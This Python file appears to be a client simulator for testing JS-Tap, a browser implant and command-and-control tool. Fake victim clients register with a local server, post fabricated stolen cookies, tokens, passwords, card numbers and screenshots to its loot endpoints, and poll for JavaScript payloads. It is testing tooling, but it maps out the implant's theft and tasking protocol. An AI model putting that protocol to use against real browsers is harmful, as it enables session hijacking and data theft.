#!/usr/bin/env python3
"""JS-Tap Client Simulator

Creates diverse fake clients, sends realistic loot, polls for custom payloads,
and prints a live status grid. Useful for testing target rules, match filtering,
autorun/repeat, and custom payload delivery.
"""

import argparse
import asyncio
import aiohttp
import base64
import json
import os
import random
import sys
import time


# ── User-Agent strings ─────────────────────────────────────────────────────────

LINUX_CHROME_UA = (
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)
LINUX_FIREFOX_UA = (
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0"
)
WIN_CHROME_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)
WIN_EDGE_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
)
MAC_SAFARI_UA = (
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.2 Safari/605.1.15"
)

# ── Client profiles ────────────────────────────────────────────────────────────

CLIENT_PROFILES = [
    {"count": 3, "tag": "wp",    "user_agent": LINUX_CHROME_UA,  "label": "Linux/Chrome"},
    {"count": 2, "tag": "wp",    "user_agent": LINUX_FIREFOX_UA, "label": "Linux/Firefox"},
    {"count": 3, "tag": "admin", "user_agent": WIN_CHROME_UA,    "label": "Win/Chrome"},
    {"count": 2, "tag": "admin", "user_agent": WIN_EDGE_UA,      "label": "Win/Edge"},
    {"count": 2, "tag": "",      "user_agent": MAC_SAFARI_UA,    "label": "Mac/Safari"},
]

# ── Fake data pools ────────────────────────────────────────────────────────────

FAKE_URLS = [
    "https://targetapp.com/dashboard",
    "https://targetapp.com/admin/users",
    "https://targetapp.com/settings/profile",
    "https://targetapp.com/api/v1/data",
    "https://targetapp.com/login",
    "https://targetapp.com/checkout",
    "https://targetapp.com/account/billing",
    "https://targetapp.com/reports/quarterly",
]

FAKE_COOKIES = [
    ("PHPSESSID", "abc123def456"),
    ("jwt_token", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.fake"),
    ("_session_id", "s3cr3t_s3ss10n_v4lu3"),
    ("csrftoken", "9f2k4j8m3n1p5q7r"),
    ("remember_me", "dXNlcjEyMzQ1Ng=="),
    ("lang", "en-US"),
]

FAKE_LOCAL_STORAGE = [
    ("authToken", "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyQGNvcnAuY29tIn0.signature"),
    ("userPrefs", '{"theme":"dark","lang":"en","notifications":true}'),
    ("cartData", '[{"id":42,"name":"Widget","qty":2}]'),
    ("lastLogin", "2025-12-15T08:30:00Z"),
]

FAKE_SESSION_STORAGE = [
    ("csrfToken", "x9f2a7b4c1e8d3"),
    ("tempAuth", "tmp_8k3m9n2p5q1r"),
    ("wizardStep", "3"),
    ("formDraft", '{"field1":"partial","field2":"data"}'),
]

FAKE_INPUTS = [
    ("username", "admin"),
    ("password", "hunter2"),
    ("email", "user@corp.com"),
    ("search", "confidential reports"),
    ("credit_card", "4111-1111-1111-1111"),
    ("ssn", "123-45-6789"),
    ("api_key", "sk-proj-abc123def456"),
]

FAKE_HTML_SNIPPETS = [
    '<html><head><title>Dashboard</title></head><body><div class="user-panel"><h1>Welcome, admin</h1><p>Last login: Dec 15, 2025</p><ul><li>Pending orders: 14</li><li>Revenue: $48,230</li></ul></div></body></html>',
    '<html><head><title>User Management</title></head><body><table class="users"><tr><th>Name</th><th>Role</th></tr><tr><td>alice@corp.com</td><td>admin</td></tr><tr><td>bob@corp.com</td><td>user</td></tr></table></body></html>',
    '<html><head><title>Settings</title></head><body><form id="profile"><input name="email" value="admin@corp.com"/><input name="phone" value="+1-555-0142"/><select name="role"><option selected>Super Admin</option></select></form></body></html>',
    '<html><head><title>API Keys</title></head><body><div class="keys"><p>Production: sk-live-abc123</p><p>Staging: sk-test-def456</p><button>Regenerate</button></div></body></html>',
]

FAKE_XHR_CALLS = [
    {
        "method": "POST",
        "url": "https://targetapp.com/api/v1/users",
        "body": base64.b64encode(b'{"name":"newuser","role":"admin"}').decode(),
        "responseBody": base64.b64encode(b'{"id":42,"status":"created"}').decode(),
        "responseStatus": 201,
        "headers": {"Authorization": "Bearer eyJhbG...", "Content-Type": "application/json"},
    },
    {
        "method": "GET",
        "url": "https://targetapp.com/api/v1/secrets",
        "body": base64.b64encode(b'').decode(),
        "responseBody": base64.b64encode(b'{"db_password":"p@ssw0rd!","api_key":"sk-secret-789"}').decode(),
        "responseStatus": 200,
        "headers": {"Authorization": "Bearer eyJhbG...", "X-API-Key": "internal-key-123"},
    },
    {
        "method": "PUT",
        "url": "https://targetapp.com/api/v1/config",
        "body": base64.b64encode(b'{"debug":true,"maintenance":false}').decode(),
        "responseBody": base64.b64encode(b'{"updated":true}').decode(),
        "responseStatus": 200,
        "headers": {"Authorization": "Bearer eyJhbG..."},
    },
]

# ── Screenshot data ────────────────────────────────────────────────────────────

SCREENSHOT_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "clientSimulatorScreenshot.png")


# ── SimClient ──────────────────────────────────────────────────────────────────

class SimClient:
    def __init__(self, index, label, tag, user_agent, server):
        self.index = index
        self.label = label
        self.tag = tag
        self.user_agent = user_agent
        self.server = server.rstrip("/")
        self.uuid = None
        self.payloads_received = []  # list of label strings

    @property
    def uuid_short(self):
        if not self.uuid:
            return "--------"
        return f"{self.uuid[:4]}..{self.uuid[-4:]}"

    async def register(self, session):
        tag_path = f"/{self.tag}" if self.tag else ""
        url = f"{self.server}/client/getToken{tag_path}"
        headers = {"User-Agent": self.user_agent}
        try:
            async with session.get(url, headers=headers, ssl=False) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    self.uuid = data["clientToken"]
                else:
                    print(f"  [!] Client {self.index} registration failed: HTTP {resp.status}")
        except Exception as e:
            print(f"  [!] Client {self.index} registration error: {e}")

    async def send_loot_round(self, session):
        if not self.uuid:
            return

        headers = {"User-Agent": self.user_agent}
        base = self.server

        # URL
        url = random.choice(FAKE_URLS)
        await self._post_json(session, f"{base}/loot/location/{self.uuid}",
                              {"url": url}, headers)

        # Cookies (1-2)
        for name, value in random.sample(FAKE_COOKIES, random.randint(1, 2)):
            await self._post_json(session, f"{base}/loot/dessert/{self.uuid}",
                                  {"cookieName": name, "cookieValue": value}, headers)

        # localStorage
        key, value = random.choice(FAKE_LOCAL_STORAGE)
        await self._post_json(session, f"{base}/loot/localstore/{self.uuid}",
                              {"key": key, "value": value}, headers)

        # sessionStorage
        key, value = random.choice(FAKE_SESSION_STORAGE)
        await self._post_json(session, f"{base}/loot/sessionstore/{self.uuid}",
                              {"key": key, "value": value}, headers)

        # User inputs (1-2)
        for name, value in random.sample(FAKE_INPUTS, random.randint(1, 2)):
            await self._post_json(session, f"{base}/loot/input/{self.uuid}",
                                  {"inputName": name, "inputValue": value}, headers)

        # HTML
        html_snippet = random.choice(FAKE_HTML_SNIPPETS)
        await self._post_json(session, f"{base}/loot/html/{self.uuid}",
                              {"url": url, "html": html_snippet}, headers)

        # Screenshot
        await self._post_screenshot(session, f"{base}/loot/screenshot/{self.uuid}", headers)

        # XHR call
        xhr = random.choice(FAKE_XHR_CALLS)
        await self._post_json(session, f"{base}/loot/xhrRequest/{self.uuid}", xhr, headers)

    async def poll_tasks(self, session):
        """Poll for payloads. Returns list of payload label strings."""
        if not self.uuid:
            return []

        headers = {"User-Agent": self.user_agent}
        url = f"{self.server}/client/taskCheck/{self.uuid}"
        new_payloads = []

        try:
            async with session.get(url, headers=headers, ssl=False) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    # Response: [{"id": N, "data": "base64-js-code"}, ...]
                    if isinstance(data, list):
                        for task in data:
                            code_b64 = task.get("data", "")
                            try:
                                code_text = base64.b64decode(code_b64).decode("utf-8", errors="replace")
                            except Exception:
                                code_text = code_b64
                            # Extract a label from the code (first ~50 meaningful chars)
                            label = self._extract_label(code_text)
                            new_payloads.append(label)
                            self.payloads_received.append(label)
                            # Send ACK
                            await self._ack_payload(session, code_text)
        except Exception:
            pass

        return new_payloads

    async def _ack_payload(self, session, payload_code):
        """ACK a received payload via customData endpoint."""
        snippet = payload_code[:80].replace("\n", " ")
        note_b64 = base64.b64encode(b"SimAck").decode()
        data_b64 = base64.b64encode(f"Received: {snippet}".encode()).decode()
        headers = {"User-Agent": self.user_agent}
        await self._post_json(session, f"{self.server}/loot/customData/{self.uuid}",
                              {"note": note_b64, "data": data_b64}, headers)

    @staticmethod
    def _extract_label(code_text):
        """Extract a short label from JS payload code."""
        # Try to find a comment like // name: ... or /* name */
        for line in code_text.split("\n")[:5]:
            stripped = line.strip()
            if stripped.startswith("//"):
                label = stripped.lstrip("/ ").strip()
                if label:
                    return label[:50]
        # Fall back to first non-empty line
        for line in code_text.split("\n"):
            stripped = line.strip()
            if stripped:
                return stripped[:50]
        return "(empty payload)"

    @staticmethod
    async def _post_json(session, url, payload, headers):
        try:
            async with session.post(url, json=payload, headers=headers, ssl=False) as resp:
                pass
        except Exception:
            pass

    async def _post_screenshot(self, session, url, headers):
        try:
            with open(SCREENSHOT_PATH, "rb") as f:
                img_data = f.read()
            hdrs = {**headers, "Content-Type": "image/png"}
            async with session.post(url, data=img_data, headers=hdrs, ssl=False) as resp:
                pass
        except Exception:
            pass


# ── StatusGrid ─────────────────────────────────────────────────────────────────

class StatusGrid:
    def __init__(self, clients):
        self.clients = clients
        self._lines_printed = 0

    def render(self, last_poll_time=None):
        """Clear previous output and reprint the status grid."""
        # Move cursor up to overwrite previous grid
        if self._lines_printed > 0:
            sys.stdout.write(f"\033[{self._lines_printed}A\033[J")

        lines = []
        bar = "\u2550" * 71
        thin = "\u2500" * 71

        total_payloads = sum(len(c.payloads_received) for c in self.clients)
        registered = sum(1 for c in self.clients if c.uuid)

        lines.append(f"\u2550{bar}")
        lines.append(f"  JS-Tap Client Simulator{' ' * 24}{registered} clients registered")
        lines.append(f"\u2550{bar}")
        lines.append(f"  {'#':>2}  {'Label':<14} {'Tag':<7} {'UUID':<12} Payloads Received")
        lines.append(f" \u2500{thin}")

        for c in self.clients:
            payloads_str = ", ".join(c.payloads_received) if c.payloads_received else ""
            # Truncate if too long
            if len(payloads_str) > 40:
                payloads_str = payloads_str[:37] + "..."
            lines.append(
                f"  {c.index:>2}  {c.label:<14} {c.tag:<7} {c.uuid_short:<12} {payloads_str}"
            )

        lines.append(f" \u2500{thin}")
        poll_str = time.strftime("%H:%M:%S", time.localtime(last_poll_time)) if last_poll_time else "--:--:--"
        lines.append(f"  Last poll: {poll_str}  |  Total payloads delivered: {total_payloads}")
        lines.append(f"\u2550{bar}")

        output = "\n".join(lines)
        print(output)
        self._lines_printed = len(lines)


# ── Main ───────────────────────────────────────────────────────────────────────

def build_clients(server):
    """Build the list of SimClient instances from CLIENT_PROFILES."""
    clients = []
    idx = 1
    for profile in CLIENT_PROFILES:
        for _ in range(profile["count"]):
            clients.append(SimClient(
                index=idx,
                label=profile["label"],
                tag=profile["tag"],
                user_agent=profile["user_agent"],
                server=server,
            ))
            idx += 1
    return clients


async def main():
    parser = argparse.ArgumentParser(description="JS-Tap Client Simulator")
    parser.add_argument("--server", default="https://127.0.0.1:8444",
                        help="JS-Tap server URL (default: https://127.0.0.1:8444)")
    parser.add_argument("--loot-rounds", type=int, default=2,
                        help="Rounds of fake loot per client (default: 2, 0 = continuous)")
    parser.add_argument("--poll-interval", type=float, default=3,
                        help="Seconds between payload polls (default: 3)")
    parser.add_argument("--no-loot", action="store_true",
                        help="Register and poll only, skip sending fake loot")
    args = parser.parse_args()

    clients = build_clients(args.server)
    grid = StatusGrid(clients)

    print(f"\n  Registering {len(clients)} clients with {args.server} ...\n")

    # Register all clients concurrently
    async with aiohttp.ClientSession() as session:
        await asyncio.gather(*(c.register(session) for c in clients))

        registered = sum(1 for c in clients if c.uuid)
        if registered == 0:
            print("  [!] No clients registered. Is the server running?")
            return

        print(f"  {registered}/{len(clients)} clients registered.\n")

        grid.render()

        # Send loot rounds
        if not args.no_loot:
            rounds = args.loot_rounds
            if rounds == 0:
                # Continuous mode: send loot in background alongside polling
                pass
            else:
                for r in range(rounds):
                    await asyncio.gather(*(c.send_loot_round(session) for c in clients if c.uuid))
                    # Small delay between rounds
                    await asyncio.sleep(0.5)
                print(f"  Sent {rounds} loot round(s). Entering poll loop (Ctrl+C to exit)...\n")
        else:
            print("  Skipping loot (--no-loot). Entering poll loop (Ctrl+C to exit)...\n")

        # Poll loop
        continuous_loot = not args.no_loot and args.loot_rounds == 0
        loot_round_counter = 0

        try:
            while True:
                # Poll all clients for tasks concurrently
                await asyncio.gather(*(c.poll_tasks(session) for c in clients if c.uuid))
                grid.render(last_poll_time=time.time())

                # If continuous loot mode, send a round periodically
                if continuous_loot:
                    loot_round_counter += 1
                    await asyncio.gather(*(c.send_loot_round(session) for c in clients if c.uuid))

                await asyncio.sleep(args.poll_interval)
        except KeyboardInterrupt:
            # Move below the grid before exiting
            print(f"\n  Shutting down. {sum(len(c.payloads_received) for c in clients)} total payloads received across {registered} clients.")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
